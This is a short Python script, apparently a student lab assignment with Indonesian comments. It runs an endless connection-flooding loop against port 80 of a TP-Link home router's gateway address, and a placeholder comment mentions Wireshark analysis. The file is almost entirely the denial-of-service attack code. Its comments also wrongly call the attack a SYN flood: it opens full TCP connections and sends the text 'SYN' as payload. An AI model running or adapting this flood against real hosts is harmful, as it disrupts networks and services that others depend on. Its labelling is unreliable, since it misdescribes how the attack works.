import socket
import time

target_host = "192.168.0.1"
target_port = 80

def syn_flood(target_host, target_port):
    while True:
        try:
            # Membuat socket TCP
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.settimeout(1)  # Timeout 1 detik

            # Menghubungkan ke target
            client_socket.connect((target_host, target_port))

            # Mengirimkan paket SYN
            client_socket.send(b'SYN')

        except socket.error as e:
            print(f"Error: {e}")

        finally:
            # Menutup koneksi
            client_socket.close()

if __name__ == "__main__":
    target_host = "192.168.0.1"  # IP Gateway Router TP-Link TR-WR840N
    target_port = 80

    try:
        syn_flood(target_host, target_port)
    except KeyboardInterrupt:
        print("Stopped.")

    # Analisis(Wireshark) hasil dan buat laporan
    # ...
    # Adam M Ali - 054120046 - Teknik Elektro UNPAK